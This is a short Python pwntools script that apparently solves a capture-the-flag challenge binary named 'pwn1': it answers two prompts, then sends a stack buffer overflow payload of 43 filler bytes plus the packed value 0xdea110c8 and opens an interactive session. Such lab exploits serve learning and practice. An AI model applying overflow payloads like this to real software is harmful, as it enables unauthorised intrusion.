from pwn import *

target = process("./pwn1")

target.sendline(b"Sir Lancelot of Camelot")
target.sendline(b"To seek the Holy Grail.")
payload = b''
payload += b'A' * 43
payload += p32(0xdea110c8)

target.sendline(payload)

target.interactive()